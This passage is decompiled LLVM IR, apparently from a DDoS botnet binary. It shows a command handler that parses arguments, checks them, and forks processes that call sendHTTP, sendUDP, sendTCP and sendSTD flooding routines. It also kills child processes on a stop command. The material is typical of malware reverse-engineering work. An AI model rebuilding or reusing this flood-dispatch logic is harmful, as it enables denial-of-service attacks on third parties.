  %v3_d8cc = call i32 @Rootsprintf(i32 %v0_d8bc, i32 ptrtoint ([38 x i8]* @global_var_1cfac.507 to i32))
  %v2_d8d8 = load i32, i32* %v1_d874, align 4
  store i32 %v2_d8d8, i32* @r5, align 4
  %v2_d8e8 = load i32, i32* %v1_d880, align 4
  store i32 %v2_d8e8, i32* @r6, align 4
  %v2_d8f8 = load i32, i32* %v1_d818, align 4
  store i32 %v2_d8f8, i32* @r0, align 4
  %v1_d900 = call i32 @atol(i32 %v2_d8f8)
  %v3_d90c = urem i32 %v1_d900, 65536
  store i32 %v3_d90c, i32* @r7, align 4
  %v1_d914 = add i32 %tmp, 16
  %v1_d918 = inttoptr i32 %v1_d914 to i32*
  %v2_d918 = load i32, i32* %v1_d918, align 4
  store i32 %v2_d918, i32* @r8, align 4
  %v2_d928 = load i32, i32* %v1_d838, align 4
  store i32 %v2_d928, i32* @r0, align 4
  %v1_d930 = call i32 @atol(i32 %v2_d928)
  store i32 %v1_d930, i32* @r4, align 4
  %v1_d93c = add i32 %tmp, 24
  %v1_d940 = inttoptr i32 %v1_d93c to i32*
  %v2_d940 = load i32, i32* %v1_d940, align 4
  store i32 %v2_d940, i32* @r0, align 4
  %v1_d948 = call i32 @atol(i32 %v2_d940)
  %v0_d950 = load i32, i32* @r4, align 4
  %v0_d958 = load i32, i32* @r5, align 4
  %v0_d95c = load i32, i32* @r6, align 4
  %v0_d960 = load i32, i32* @r7, align 4
  %v0_d964 = load i32, i32* @r8, align 4
  %v6_d968 = trunc i32 %v0_d960 to i16
  %v7_d968 = call i32 @sendHTTP(i32 %v0_d958, i32 %v0_d95c, i16 %v6_d968, i32 %v0_d964, i32 %v0_d950, i32 %v1_d948)
  %v2_d970 = call i32 @__GI_exit(i16 0)
  br label %dec_label_pc_d974

dec_label_pc_d974:                                ; preds = %dec_label_pc_d7e4, %dec_label_pc_d864
  %v2_d978 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1cfd4.509 to i32), i32* @r1, align 4
  %v3_d984 = inttoptr i32 %v2_d978 to i8*
  %v4_d984 = call i32 @__GI_strcoll(i8* %v3_d984, i32 ptrtoint ([4 x i8]* @global_var_1cfd4.509 to i32))
  %v2_d98c = icmp eq i32 %v4_d984, 0
  br i1 %v2_d98c, label %dec_label_pc_d994, label %dec_label_pc_dcf4

dec_label_pc_d994:                                ; preds = %dec_label_pc_d974
  %v7_d99c = icmp slt i32 %arg1, 6
  br i1 %v7_d99c, label %dec_label_pc_dab4, label %dec_label_pc_d9a0

dec_label_pc_d9a0:                                ; preds = %dec_label_pc_d994
  %v1_d9a4 = add i32 %tmp, 12
  %v1_d9a8 = inttoptr i32 %v1_d9a4 to i32*
  %v2_d9a8 = load i32, i32* %v1_d9a8, align 4
  store i32 %v2_d9a8, i32* @r0, align 4
  %v1_d9b0 = call i32 @atol(i32 %v2_d9a8)
  %v7_d9b8 = icmp eq i32 %v1_d9b0, -1
  br i1 %v7_d9b8, label %dec_label_pc_dab4, label %dec_label_pc_d9c0

dec_label_pc_d9c0:                                ; preds = %dec_label_pc_d9a0
  %v1_d9c4 = add i32 %tmp, 8
  %v1_d9c8 = inttoptr i32 %v1_d9c4 to i32*
  %v2_d9c8 = load i32, i32* %v1_d9c8, align 4
  store i32 %v2_d9c8, i32* @r0, align 4
  %v1_d9d0 = call i32 @atol(i32 %v2_d9c8)
  %v7_d9d8 = icmp eq i32 %v1_d9d0, -1
  br i1 %v7_d9d8, label %dec_label_pc_dab4, label %dec_label_pc_d9e0

dec_label_pc_d9e0:                                ; preds = %dec_label_pc_d9c0
  %v1_d9e4 = add i32 %tmp, 16
  %v1_d9e8 = inttoptr i32 %v1_d9e4 to i32*
  %v2_d9e8 = load i32, i32* %v1_d9e8, align 4
  store i32 %v2_d9e8, i32* @r0, align 4
  %v1_d9f0 = call i32 @atol(i32 %v2_d9e8)
  %v7_d9f8 = icmp eq i32 %v1_d9f0, -1
  br i1 %v7_d9f8, label %dec_label_pc_dab4, label %dec_label_pc_da00

dec_label_pc_da00:                                ; preds = %dec_label_pc_d9e0
  %v1_da04 = add i32 %tmp, 20
  %v1_da08 = inttoptr i32 %v1_da04 to i32*
  %v2_da08 = load i32, i32* %v1_da08, align 4
  store i32 %v2_da08, i32* @r0, align 4
  %v1_da10 = call i32 @atol(i32 %v2_da08)
  %v7_da18 = icmp eq i32 %v1_da10, -1
  br i1 %v7_da18, label %dec_label_pc_dab4, label %dec_label_pc_da20

dec_label_pc_da20:                                ; preds = %dec_label_pc_da00
  %v2_da28 = load i32, i32* %v1_da08, align 4
  store i32 %v2_da28, i32* @r0, align 4
  %v1_da30 = call i32 @atol(i32 %v2_da28)
  %v8_da3c = icmp sgt i32 %v1_da30, 65536
  br i1 %v8_da3c, label %dec_label_pc_dab4, label %dec_label_pc_da40

dec_label_pc_da40:                                ; preds = %dec_label_pc_da20
  %v2_da48 = load i32, i32* %v1_da08, align 4
  store i32 %v2_da48, i32* @r0, align 4
  %v1_da50 = call i32 @atol(i32 %v2_da48)
  store i32 %v1_da50, i32* @r2, align 4
  %v8_da64 = icmp sgt i32 %v1_da50, ptrtoint (i32* @global_var_ffdc.510 to i32)
  br i1 %v8_da64, label %dec_label_pc_dab4, label %dec_label_pc_da68

dec_label_pc_da68:                                ; preds = %dec_label_pc_da40
  %v2_da70 = load i32, i32* %v1_d9e8, align 4
  store i32 %v2_da70, i32* @r0, align 4
  %v1_da78 = call i32 @atol(i32 %v2_da70)
  %v8_da84 = icmp sgt i32 %v1_da78, 32
  br i1 %v8_da84, label %dec_label_pc_dab4, label %dec_label_pc_da88

dec_label_pc_da88:                                ; preds = %dec_label_pc_da68
  %v7_da8c = icmp eq i32 %arg1, 7
  br i1 %v7_da8c, label %dec_label_pc_da94, label %dec_label_pc_dacc

dec_label_pc_da94:                                ; preds = %dec_label_pc_da88
  %v1_da98 = add i32 %tmp, 24
  %v1_da9c = inttoptr i32 %v1_da98 to i32*
  %v2_da9c = load i32, i32* %v1_da9c, align 4
  store i32 %v2_da9c, i32* @r0, align 4
  %v1_daa4 = call i32 @atol(i32 %v2_da9c)
  %v5_dab0 = icmp sgt i32 %v1_daa4, 0
  br i1 %v5_dab0, label %dec_label_pc_dacc, label %dec_label_pc_dab4

dec_label_pc_dab4:                                ; preds = %dec_label_pc_da94, %dec_label_pc_da68, %dec_label_pc_da40, %dec_label_pc_da20, %dec_label_pc_da00, %dec_label_pc_d9e0, %dec_label_pc_d9c0, %dec_label_pc_d9a0, %dec_label_pc_d994
  %v2_dab8 = load i32, i32* @global_var_272d0.45, align 4
  %v3_dac4 = call i32 @Rootsprintf(i32 %v2_dab8, i32 ptrtoint ([113 x i8]* @global_var_1cfd8.512 to i32))
  br label %dec_label_pc_e268

dec_label_pc_dacc:                                ; preds = %dec_label_pc_da88, %dec_label_pc_da94
  %v1_dad0 = add i32 %tmp, 4
  %v1_dad4 = inttoptr i32 %v1_dad0 to i32*
  %v2_dad4 = load i32, i32* %v1_dad4, align 4
  %v2_dae4 = load i32, i32* %v1_d9c8, align 4
  store i32 %v2_dae4, i32* @r0, align 4
  %v1_daec = call i32 @atol(i32 %v2_dae4)
  %v2_db00 = load i32, i32* %v1_d9a8, align 4
  store i32 %v2_db00, i32* @r0, align 4
  %v1_db08 = call i32 @atol(i32 %v2_db00)
  %v2_db1c = load i32, i32* %v1_d9e8, align 4
  store i32 %v2_db1c, i32* @r0, align 4
  %v1_db24 = call i32 @atol(i32 %v2_db1c)
  %v2_db38 = load i32, i32* %v1_da08, align 4
  store i32 %v2_db38, i32* @r0, align 4
  %v1_db40 = call i32 @atol(i32 %v2_db38)
  %v7_db54 = icmp slt i32 %arg1, 7
  br i1 %v7_db54, label %dec_label_pc_db74, label %dec_label_pc_db58

dec_label_pc_db58:                                ; preds = %dec_label_pc_dacc
  %v1_db5c = add i32 %tmp, 24
  %v1_db60 = inttoptr i32 %v1_db5c to i32*
  %v2_db60 = load i32, i32* %v1_db60, align 4
  store i32 %v2_db60, i32* @r0, align 4
  %v1_db68 = call i32 @atol(i32 %v2_db60)
  br label %dec_label_pc_db7c

dec_label_pc_db74:                                ; preds = %dec_label_pc_dacc
  br label %dec_label_pc_db7c

dec_label_pc_db7c:                                ; preds = %dec_label_pc_db58, %dec_label_pc_db74
  %storemerge8 = phi i32 [ 1000, %dec_label_pc_db74 ], [ %v1_db68, %dec_label_pc_db58 ]
  %v7_db8c = icmp slt i32 %arg1, 8
  br i1 %v7_db8c, label %dec_label_pc_dbac, label %dec_label_pc_db90

dec_label_pc_db90:                                ; preds = %dec_label_pc_db7c
  %v1_db94 = add i32 %tmp, 28
  %v1_db98 = inttoptr i32 %v1_db94 to i32*
  %v2_db98 = load i32, i32* %v1_db98, align 4
  store i32 %v2_db98, i32* @r0, align 4
  %v1_dba0 = call i32 @atol(i32 %v2_db98)
  br label %dec_label_pc_dbc0

dec_label_pc_dbac:                                ; preds = %dec_label_pc_db7c
  br label %dec_label_pc_dbc0

dec_label_pc_dbc0:                                ; preds = %dec_label_pc_db90, %dec_label_pc_dbac
  %storemerge7 = phi i32 [ 1000000, %dec_label_pc_dbac ], [ %v1_dba0, %dec_label_pc_db90 ]
  %v7_dbd0 = icmp slt i32 %arg1, 9
  br i1 %v7_dbd0, label %dec_label_pc_dbf0, label %dec_label_pc_dbd4

dec_label_pc_dbd4:                                ; preds = %dec_label_pc_dbc0
  %v1_dbd8 = add i32 %tmp, 32
  %v1_dbdc = inttoptr i32 %v1_dbd8 to i32*
  %v2_dbdc = load i32, i32* %v1_dbdc, align 4
  store i32 %v2_dbdc, i32* @r0, align 4
  %v1_dbe4 = call i32 @atol(i32 %v2_dbdc)
  br label %dec_label_pc_dbf8

dec_label_pc_dbf0:                                ; preds = %dec_label_pc_dbc0
  br label %dec_label_pc_dbf8

dec_label_pc_dbf8:                                ; preds = %dec_label_pc_dbd4, %dec_label_pc_dbf0
  %storemerge6 = phi i32 [ 0, %dec_label_pc_dbf0 ], [ %v1_dbe4, %dec_label_pc_dbd4 ]
  store i32 %v2_dad4, i32* @r0, align 4
  %v2_dc0c = call i32 @__GI_strchr(i32 %v2_dad4, i32 44)
  store i32 %v2_dc0c, i32* @r0, align 4
  %v2_dc14 = icmp eq i32 %v2_dc0c, 0
  br i1 %v2_dc14, label %dec_label_pc_dca8, label %dec_label_pc_dc1c

dec_label_pc_dc1c:                                ; preds = %dec_label_pc_dbf8
  %v2_dc28 = call i32 @__GI_strtok(i32 %v2_dad4, i32 ptrtoint (i32* @global_var_1cf50.477 to i32))
  store i32 %v2_dc28, i32* @r0, align 4
  %v2_dc9c24 = icmp eq i32 %v2_dc28, 0
  br i1 %v2_dc9c24, label %dec_label_pc_e268, label %dec_label_pc_dc38

dec_label_pc_dc38:                                ; preds = %dec_label_pc_dc1c, %dec_label_pc_dc84
  %storemerge1525 = phi i32 [ %v2_dc8c, %dec_label_pc_dc84 ], [ %v2_dc28, %dec_label_pc_dc1c ]
  %v0_dc38 = call i32 @listFork()
  %v2_dc40 = icmp eq i32 %v0_dc38, 0
  br i1 %v2_dc40, label %dec_label_pc_dc48, label %dec_label_pc_dc84

dec_label_pc_dc48:                                ; preds = %dec_label_pc_dc38
  %v8_dc78 = call i32 @sendUDP(i32 %storemerge1525, i32 %v1_daec, i32 %v1_db08, i32 %v1_db24, i32 %v1_db40, i32 %storemerge8, i32 %storemerge7, i32 %storemerge6)
  %v1_dc80 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_dc84

dec_label_pc_dc84:                                ; preds = %dec_label_pc_dc38, %dec_label_pc_dc48
  %v2_dc8c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1cf50.477 to i32))
  store i32 %v2_dc8c, i32* @r0, align 4
  %v2_dc9c = icmp eq i32 %v2_dc8c, 0
  br i1 %v2_dc9c, label %dec_label_pc_e268, label %dec_label_pc_dc38

dec_label_pc_dca8:                                ; preds = %dec_label_pc_dbf8
  %v0_dca8 = call i32 @listFork()
  %v2_dcb0 = icmp eq i32 %v0_dca8, 0
  br i1 %v2_dcb0, label %dec_label_pc_dcb8, label %dec_label_pc_e268

dec_label_pc_dcb8:                                ; preds = %dec_label_pc_dca8
  %v8_dce8 = call i32 @sendUDP(i32 %v2_dad4, i32 %v1_daec, i32 %v1_db08, i32 %v1_db24, i32 %v1_db40, i32 %storemerge8, i32 %storemerge7, i32 %storemerge6)
  %v1_dcf0 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_dcf4

dec_label_pc_dcf4:                                ; preds = %dec_label_pc_d974, %dec_label_pc_dcb8
  %v2_dcf8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1d04c.515 to i32), i32* @r1, align 4
  %v3_dd04 = inttoptr i32 %v2_dcf8 to i8*
  %v4_dd04 = call i32 @__GI_strcoll(i8* %v3_dd04, i32 ptrtoint ([4 x i8]* @global_var_1d04c.515 to i32))
  %v2_dd0c = icmp eq i32 %v4_dd04, 0
  br i1 %v2_dd0c, label %dec_label_pc_dd14, label %dec_label_pc_dfd8

dec_label_pc_dd14:                                ; preds = %dec_label_pc_dcf4
  %v7_dd1c = icmp slt i32 %arg1, 6
  br i1 %v7_dd1c, label %dec_label_pc_ddf8, label %dec_label_pc_dd20

dec_label_pc_dd20:                                ; preds = %dec_label_pc_dd14
  %v1_dd24 = add i32 %tmp, 12
  %v1_dd28 = inttoptr i32 %v1_dd24 to i32*
  %v2_dd28 = load i32, i32* %v1_dd28, align 4
  store i32 %v2_dd28, i32* @r0, align 4
  %v1_dd30 = call i32 @atol(i32 %v2_dd28)
  %v7_dd38 = icmp eq i32 %v1_dd30, -1
  br i1 %v7_dd38, label %dec_label_pc_ddf8, label %dec_label_pc_dd40

dec_label_pc_dd40:                                ; preds = %dec_label_pc_dd20
  %v1_dd44 = add i32 %tmp, 8
  %v1_dd48 = inttoptr i32 %v1_dd44 to i32*
  %v2_dd48 = load i32, i32* %v1_dd48, align 4
  store i32 %v2_dd48, i32* @r0, align 4
  %v1_dd50 = call i32 @atol(i32 %v2_dd48)
  %v7_dd58 = icmp eq i32 %v1_dd50, -1
  br i1 %v7_dd58, label %dec_label_pc_ddf8, label %dec_label_pc_dd60

dec_label_pc_dd60:                                ; preds = %dec_label_pc_dd40
  %v1_dd64 = add i32 %tmp, 16
  %v1_dd68 = inttoptr i32 %v1_dd64 to i32*
  %v2_dd68 = load i32, i32* %v1_dd68, align 4
  store i32 %v2_dd68, i32* @r0, align 4
  %v1_dd70 = call i32 @atol(i32 %v2_dd68)
  %v7_dd78 = icmp eq i32 %v1_dd70, -1
  br i1 %v7_dd78, label %dec_label_pc_ddf8, label %dec_label_pc_dd80

dec_label_pc_dd80:                                ; preds = %dec_label_pc_dd60
  %v2_dd88 = load i32, i32* %v1_dd68, align 4
  store i32 %v2_dd88, i32* @r0, align 4
  %v1_dd90 = call i32 @atol(i32 %v2_dd88)
  %v8_dd9c = icmp sgt i32 %v1_dd90, 32
  br i1 %v8_dd9c, label %dec_label_pc_ddf8, label %dec_label_pc_dda0

dec_label_pc_dda0:                                ; preds = %dec_label_pc_dd80
  %v7_dda8 = icmp slt i32 %arg1, 7
  br i1 %v7_dda8, label %dec_label_pc_ddcc, label %dec_label_pc_ddac

dec_label_pc_ddac:                                ; preds = %dec_label_pc_dda0
  %v1_ddb0 = add i32 %tmp, 24
  %v1_ddb4 = inttoptr i32 %v1_ddb0 to i32*
  %v2_ddb4 = load i32, i32* %v1_ddb4, align 4
  store i32 %v2_ddb4, i32* @r0, align 4
  %v1_ddbc = call i32 @atol(i32 %v2_ddb4)
  %v1_ddc4 = icmp slt i32 %v1_ddbc, 0
  br i1 %v1_ddc4, label %dec_label_pc_ddf8, label %dec_label_pc_ddcc

dec_label_pc_ddcc:                                ; preds = %dec_label_pc_ddac, %dec_label_pc_dda0
  %v7_ddd0 = icmp eq i32 %arg1, 8
  br i1 %v7_ddd0, label %dec_label_pc_ddd8, label %dec_label_pc_de10

dec_label_pc_ddd8:                                ; preds = %dec_label_pc_ddcc
  %v1_dddc = add i32 %tmp, 28
  %v1_dde0 = inttoptr i32 %v1_dddc to i32*
  %v2_dde0 = load i32, i32* %v1_dde0, align 4
  store i32 %v2_dde0, i32* @r0, align 4
  %v1_dde8 = call i32 @atol(i32 %v2_dde0)
  %v5_ddf4 = icmp sgt i32 %v1_dde8, 0
  br i1 %v5_ddf4, label %dec_label_pc_de10, label %dec_label_pc_ddf8

dec_label_pc_ddf8:                                ; preds = %dec_label_pc_ddd8, %dec_label_pc_ddac, %dec_label_pc_dd80, %dec_label_pc_dd60, %dec_label_pc_dd40, %dec_label_pc_dd20, %dec_label_pc_dd14
  %v2_ddfc = load i32, i32* @global_var_272d0.45, align 4
  %v3_de08 = call i32 @Rootsprintf(i32 %v2_ddfc, i32 ptrtoint ([186 x i8]* @global_var_1d050.517 to i32))
  br label %dec_label_pc_e268

dec_label_pc_de10:                                ; preds = %dec_label_pc_ddcc, %dec_label_pc_ddd8
  %v1_de14 = add i32 %tmp, 4
  %v1_de18 = inttoptr i32 %v1_de14 to i32*
  %v2_de18 = load i32, i32* %v1_de18, align 4
  %v2_de28 = load i32, i32* %v1_dd48, align 4
  store i32 %v2_de28, i32* @r0, align 4
  %v1_de30 = call i32 @atol(i32 %v2_de28)
  %v2_de44 = load i32, i32* %v1_dd28, align 4
  store i32 %v2_de44, i32* @r0, align 4
  %v1_de4c = call i32 @atol(i32 %v2_de44)
  %v2_de60 = load i32, i32* %v1_dd68, align 4
  store i32 %v2_de60, i32* @r0, align 4
  %v1_de68 = call i32 @atol(i32 %v2_de60)
  %v1_de78 = add i32 %tmp, 20
  %v1_de7c = inttoptr i32 %v1_de78 to i32*
  %v2_de7c = load i32, i32* %v1_de7c, align 4
  br i1 %v7_ddd0, label %dec_label_pc_de90, label %dec_label_pc_deac

dec_label_pc_de90:                                ; preds = %dec_label_pc_de10
  %v1_de94 = add i32 %tmp, 28
  %v1_de98 = inttoptr i32 %v1_de94 to i32*
  %v2_de98 = load i32, i32* %v1_de98, align 4
  store i32 %v2_de98, i32* @r0, align 4
  %v1_dea0 = call i32 @atol(i32 %v2_de98)
  br label %dec_label_pc_deb4

dec_label_pc_deac:                                ; preds = %dec_label_pc_de10
  br label %dec_label_pc_deb4

dec_label_pc_deb4:                                ; preds = %dec_label_pc_de90, %dec_label_pc_deac
  %storemerge5 = phi i32 [ 10, %dec_label_pc_deac ], [ %v1_dea0, %dec_label_pc_de90 ]
  br i1 %v7_dda8, label %dec_label_pc_dee4, label %dec_label_pc_dec8

dec_label_pc_dec8:                                ; preds = %dec_label_pc_deb4
  %v1_decc = add i32 %tmp, 24
  %v1_ded0 = inttoptr i32 %v1_decc to i32*
  %v2_ded0 = load i32, i32* %v1_ded0, align 4
  store i32 %v2_ded0, i32* @r0, align 4
  %v1_ded8 = call i32 @atol(i32 %v2_ded0)
  br label %dec_label_pc_deec

dec_label_pc_dee4:                                ; preds = %dec_label_pc_deb4
  br label %dec_label_pc_deec

dec_label_pc_deec:                                ; preds = %dec_label_pc_dec8, %dec_label_pc_dee4
  %storemerge4 = phi i32 [ 0, %dec_label_pc_dee4 ], [ %v1_ded8, %dec_label_pc_dec8 ]
  store i32 %v2_de18, i32* @r0, align 4
  %v2_df00 = call i32 @__GI_strchr(i32 %v2_de18, i32 44)
  store i32 %v2_df00, i32* @r0, align 4
  %v2_df08 = icmp eq i32 %v2_df00, 0
  br i1 %v2_df08, label %dec_label_pc_df94, label %dec_label_pc_df10

dec_label_pc_df10:                                ; preds = %dec_label_pc_deec
  %v2_df1c = call i32 @__GI_strtok(i32 %v2_de18, i32 ptrtoint (i32* @global_var_1cf50.477 to i32))
  store i32 %v2_df1c, i32* @r0, align 4
  %v2_df8821 = icmp eq i32 %v2_df1c, 0
  br i1 %v2_df8821, label %dec_label_pc_dfd8, label %dec_label_pc_df2c

dec_label_pc_df2c:                                ; preds = %dec_label_pc_df10, %dec_label_pc_df70
  %storemerge1322 = phi i32 [ %v2_df78, %dec_label_pc_df70 ], [ %v2_df1c, %dec_label_pc_df10 ]
  %v0_df2c = call i32 @listFork()
  %v2_df34 = icmp eq i32 %v0_df2c, 0
  br i1 %v2_df34, label %dec_label_pc_df3c, label %dec_label_pc_df70

dec_label_pc_df3c:                                ; preds = %dec_label_pc_df2c
  %v7_df64 = call i32 @sendTCP(i32 %storemerge1322, i32 %v1_de30, i32 %v1_de4c, i32 %v1_de68, i32 %v2_de7c, i32 %storemerge4, i32 %storemerge5)
  %v1_df6c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_df70

dec_label_pc_df70:                                ; preds = %dec_label_pc_df2c, %dec_label_pc_df3c
  %v2_df78 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1cf50.477 to i32))
  store i32 %v2_df78, i32* @r0, align 4
  %v2_df88 = icmp eq i32 %v2_df78, 0
  br i1 %v2_df88, label %dec_label_pc_dfd8, label %dec_label_pc_df2c

dec_label_pc_df94:                                ; preds = %dec_label_pc_deec
  %v0_df94 = call i32 @listFork()
  %v2_df9c = icmp eq i32 %v0_df94, 0
  br i1 %v2_df9c, label %dec_label_pc_dfa4, label %dec_label_pc_dfd8

dec_label_pc_dfa4:                                ; preds = %dec_label_pc_df94
  %v7_dfcc = call i32 @sendTCP(i32 %v2_de18, i32 %v1_de30, i32 %v1_de4c, i32 %v1_de68, i32 %v2_de7c, i32 %storemerge4, i32 %storemerge5)
  %v1_dfd4 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_dfd8

dec_label_pc_dfd8:                                ; preds = %dec_label_pc_df70, %dec_label_pc_df10, %dec_label_pc_df94, %dec_label_pc_dcf4, %dec_label_pc_dfa4
  %v2_dfdc = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1d10c.519 to i32), i32* @r1, align 4
  %v3_dfe8 = inttoptr i32 %v2_dfdc to i8*
  %v4_dfe8 = call i32 @__GI_strcoll(i8* %v3_dfe8, i32 ptrtoint ([4 x i8]* @global_var_1d10c.519 to i32))
  %v2_dff0 = icmp eq i32 %v4_dfe8, 0
  br i1 %v2_dff0, label %dec_label_pc_dff8, label %dec_label_pc_e150

dec_label_pc_dff8:                                ; preds = %dec_label_pc_dfd8
  %v7_e000 = icmp slt i32 %arg1, 4
  br i1 %v7_e000, label %dec_label_pc_e044, label %dec_label_pc_e004

dec_label_pc_e004:                                ; preds = %dec_label_pc_dff8
  %v1_e008 = add i32 %tmp, 8
  %v1_e00c = inttoptr i32 %v1_e008 to i32*
  %v2_e00c = load i32, i32* %v1_e00c, align 4
  store i32 %v2_e00c, i32* @r0, align 4
  %v1_e014 = call i32 @atol(i32 %v2_e00c)
  %tmp82 = icmp slt i32 %v1_e014, 1
  br i1 %tmp82, label %dec_label_pc_e044, label %dec_label_pc_e024

dec_label_pc_e024:                                ; preds = %dec_label_pc_e004
  %v1_e028 = add i32 %tmp, 12
  %v1_e02c = inttoptr i32 %v1_e028 to i32*
  %v2_e02c = load i32, i32* %v1_e02c, align 4
  store i32 %v2_e02c, i32* @r0, align 4
  %v1_e034 = call i32 @atol(i32 %v2_e02c)
  %v5_e040 = icmp sgt i32 %v1_e034, 0
  br i1 %v5_e040, label %dec_label_pc_e05c, label %dec_label_pc_e044

dec_label_pc_e044:                                ; preds = %dec_label_pc_e024, %dec_label_pc_e004, %dec_label_pc_dff8
  %v2_e048 = load i32, i32* @global_var_272d0.45, align 4
  %v3_e054 = call i32 @Rootsprintf(i32 %v2_e048, i32 ptrtoint ([27 x i8]* @global_var_1d110.521 to i32))
  br label %dec_label_pc_e268

dec_label_pc_e05c:                                ; preds = %dec_label_pc_e024
  %v1_e060 = add i32 %tmp, 4
  %v1_e064 = inttoptr i32 %v1_e060 to i32*
  %v2_e064 = load i32, i32* %v1_e064, align 4
  %v2_e074 = load i32, i32* %v1_e00c, align 4
  store i32 %v2_e074, i32* @r0, align 4
  %v1_e07c = call i32 @atol(i32 %v2_e074)
  %v2_e090 = load i32, i32* %v1_e02c, align 4
  store i32 %v2_e090, i32* @r0, align 4
  %v1_e098 = call i32 @atol(i32 %v2_e090)
  store i32 %v2_e064, i32* @r0, align 4
  %v2_e0b0 = call i32 @__GI_strchr(i32 %v2_e064, i32 44)
  store i32 %v2_e0b0, i32* @r0, align 4
  %v2_e0b8 = icmp eq i32 %v2_e0b0, 0
  br i1 %v2_e0b8, label %dec_label_pc_e128, label %dec_label_pc_e0c0

dec_label_pc_e0c0:                                ; preds = %dec_label_pc_e05c
  %v2_e0cc = call i32 @__GI_strtok(i32 %v2_e064, i32 ptrtoint (i32* @global_var_1cf50.477 to i32))
  store i32 %v2_e0cc, i32* @r0, align 4
  %v2_e11c18 = icmp eq i32 %v2_e0cc, 0
  br i1 %v2_e11c18, label %dec_label_pc_e150, label %dec_label_pc_e0dc

dec_label_pc_e0dc:                                ; preds = %dec_label_pc_e0c0, %dec_label_pc_e104
  %storemerge1119 = phi i32 [ %v2_e10c, %dec_label_pc_e104 ], [ %v2_e0cc, %dec_label_pc_e0c0 ]
  %v0_e0dc = call i32 @listFork()
  %v2_e0e4 = icmp eq i32 %v0_e0dc, 0
  br i1 %v2_e0e4, label %dec_label_pc_e0ec, label %dec_label_pc_e104

dec_label_pc_e0ec:                                ; preds = %dec_label_pc_e0dc
  %v4_e0f8 = call i32 @sendSTD(i32 %storemerge1119, i32 %v1_e07c, i32 %v1_e098, i32 0)
  %v1_e100 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_e104

dec_label_pc_e104:                                ; preds = %dec_label_pc_e0dc, %dec_label_pc_e0ec
  %v2_e10c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1cf50.477 to i32))
  store i32 %v2_e10c, i32* @r0, align 4
  %v2_e11c = icmp eq i32 %v2_e10c, 0
  br i1 %v2_e11c, label %dec_label_pc_e150, label %dec_label_pc_e0dc

dec_label_pc_e128:                                ; preds = %dec_label_pc_e05c
  %v0_e128 = call i32 @listFork()
  %v2_e130 = icmp eq i32 %v0_e128, 0
  br i1 %v2_e130, label %dec_label_pc_e138, label %dec_label_pc_e268

dec_label_pc_e138:                                ; preds = %dec_label_pc_e128
  %v4_e144 = call i32 @sendSTD(i32 %v2_e064, i32 %v1_e07c, i32 %v1_e098, i32 0)
  %v1_e14c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_e150

dec_label_pc_e150:                                ; preds = %dec_label_pc_e104, %dec_label_pc_e0c0, %dec_label_pc_dfd8, %dec_label_pc_e138
  %v2_e154 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1d12c.523 to i32), i32* @r1, align 4
  %v3_e160 = inttoptr i32 %v2_e154 to i8*
  %v4_e160 = call i32 @__GI_strcoll(i8* %v3_e160, i32 ptrtoint ([5 x i8]* @global_var_1d12c.523 to i32))
  store i32 %v4_e160, i32* @r0, align 4
  %v2_e168 = icmp eq i32 %v4_e160, 0
  br i1 %v2_e168, label %dec_label_pc_e170, label %dec_label_pc_e268

dec_label_pc_e170:                                ; preds = %dec_label_pc_e150
  br label %dec_label_pc_e214

dec_label_pc_e184:                                ; preds = %dec_label_pc_e214, %dec_label_pc_e248
  %v3_e188 = mul i32 %storemerge9, 4
  %v2_e194 = load i32, i32* @global_var_2d540.66, align 4
  %v2_e198 = add i32 %v2_e194, %v3_e188
  %v1_e19c = inttoptr i32 %v2_e198 to i32*
  %v2_e19c = load i32, i32* %v1_e19c, align 4
  %v2_e1a0 = icmp eq i32 %v2_e19c, 0
  br i1 %v2_e1a0, label %dec_label_pc_e208, label %dec_label_pc_e1a8

dec_label_pc_e1a8:                                ; preds = %dec_label_pc_e184
  %v2_e1c0 = load i32, i32* %v1_e19c, align 4
  %v0_e1c4 = call i32 @__GI_getpid()
  store i32 %v0_e1c4, i32* @r0, align 4
  %v9_e1cc = icmp eq i32 %v2_e1c0, %v0_e1c4
  br i1 %v9_e1cc, label %dec_label_pc_e208, label %dec_label_pc_e1d4

dec_label_pc_e1d4:                                ; preds = %dec_label_pc_e1a8
  %v2_e1e4 = load i32, i32* @global_var_2d540.66, align 4
  %v2_e1e8 = add i32 %v2_e1e4, %v3_e188
  %v1_e1ec = inttoptr i32 %v2_e1e8 to i32*
  %v2_e1ec = load i32, i32* %v1_e1ec, align 4
  %v2_e1f8 = call i32 @kill(i32 %v2_e1ec, i32 9)
  store i32 %v2_e1f8, i32* @r0, align 4
  %v1_e200 = add i32 %stack_var_-48.1, 1
  br label %dec_label_pc_e208

dec_label_pc_e208:                                ; preds = %dec_label_pc_e1a8, %dec_label_pc_e184, %dec_label_pc_e1d4
  %v1_e27027 = phi i32 [ %v1_e27028, %dec_label_pc_e184 ], [ %v0_e1c4, %dec_label_pc_e1a8 ], [ %v2_e1f8, %dec_label_pc_e1d4 ]
  %stack_var_-48.0 = phi i32 [ %stack_var_-48.1, %dec_label_pc_e184 ], [ %stack_var_-48.1, %dec_label_pc_e1a8 ], [ %v1_e200, %dec_label_pc_e1d4 ]
  %v1_e20c = add i32 %storemerge9, 1
  br label %dec_label_pc_e214

dec_label_pc_e214:                                ; preds = %dec_label_pc_e170, %dec_label_pc_e208
  %v1_e27028 = phi i32 [ 0, %dec_label_pc_e170 ], [ %v1_e27027, %dec_label_pc_e208 ]
  %stack_var_-48.1 = phi i32 [ 0, %dec_label_pc_e170 ], [ %stack_var_-48.0, %dec_label_pc_e208 ]
  %storemerge9 = phi i32 [ 0, %dec_label_pc_e170 ], [ %v1_e20c, %dec_label_pc_e208 ]
  %v5_e22c = load i32, i32* @global_var_272dc.64, align 4
